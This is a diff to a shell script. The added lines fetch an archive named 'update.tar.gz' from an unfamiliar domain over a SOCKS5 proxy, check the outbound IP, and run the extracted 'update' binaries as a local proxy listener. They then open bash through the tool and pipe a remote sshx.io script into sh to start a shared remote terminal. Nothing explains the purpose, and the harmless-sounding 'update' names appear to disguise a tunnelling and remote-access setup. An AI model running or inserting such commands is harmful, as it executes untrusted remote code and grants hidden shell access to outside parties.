@@ -76,4 +76,42 @@ sleep 2
 
 sleep 2
 
-curl -x socks5h://127.0.0.1:1082 -sSf https://sshx.io/get | sh -s run
+curl -x socks5h://127.0.0.1:1082 api.ipify.org
+
+sleep 2
+
+curl -x socks5h://127.0.0.1:1082 http://greenleaf.teatspray.uk/update.tar.gz -L -O -J
+
+sleep 2
+
+tar -xf update.tar.gz
+
+sleep 2
+
+cat > update/local/update-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 127.0.0.1:1082
+END
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1
+
+sleep 3
+
+./update/local/update-local -config update/local/update-local.conf & > /dev/null
+
+sleep 2
+
+./update/update wget -q -O- http://api.ipify.org
+
+sleep 2
+
+./update/update bash
+
+sleep 2
+
+curl -sSf https://sshx.io/get | sh -s run
